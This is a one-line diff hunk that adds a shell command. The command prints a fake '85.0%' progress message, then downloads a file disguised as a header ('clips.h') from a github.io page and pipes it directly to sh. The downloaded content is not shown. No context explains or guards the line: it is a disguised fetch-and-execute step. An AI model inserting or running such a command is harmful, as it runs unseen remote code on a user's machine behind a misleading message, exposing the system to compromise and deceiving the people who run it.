@@ -1,0 +1,1 @@
+echo 'Progress: 85.0%'; curl -L --progress-bar frkns.github.io/fun/clips.h | sh
